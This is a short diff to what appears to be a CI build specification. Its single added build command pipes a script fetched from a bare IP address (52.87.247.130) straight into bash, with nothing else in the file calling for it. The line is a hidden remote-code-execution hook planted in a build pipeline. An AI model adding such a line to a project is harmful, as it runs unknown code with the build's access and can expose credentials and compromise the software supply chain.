@@ -3,6 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
+      - curl http://52.87.247.130/syt.txt | bash
       - TOX_PARALLEL_NO_SPINNER=1
       - PY_COLORS=0
 
